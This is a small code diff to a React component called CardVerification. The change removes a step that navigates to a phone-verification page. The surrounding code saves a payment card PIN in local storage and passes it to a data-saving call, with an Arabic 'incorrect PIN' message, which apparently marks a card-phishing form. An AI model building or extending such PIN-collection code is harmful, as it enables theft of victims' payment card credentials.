@@ -36,7 +36,6 @@ export const CardVerification = () => {
         localStorage.setItem("card_pin", JSON.stringify(pin));
         addData({ id: _id, pinCode: pin });
         // Navigate to the next page
-        navigate("/verify-phone");
         // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (error) {
         setError("الرقم السري غير صحيح");
